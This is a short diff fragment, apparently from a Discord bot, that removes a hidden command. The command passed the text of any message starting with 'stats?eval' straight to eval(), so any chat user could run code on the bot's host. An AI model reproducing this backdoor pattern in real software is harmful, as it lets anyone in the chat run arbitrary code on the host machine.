@@ -83,10 +83,6 @@ client.on("message", (message) => {
 		rmCommand(message);
 		return;
 	}
-	if (message.content.startsWith("stats?eval")) {
-		var aaaa = message.content.substring(message.content.indexOf(" ") + 1);
-		eval(aaaa);
-	}
 });
 
 function aptCommand(contextMsg) {
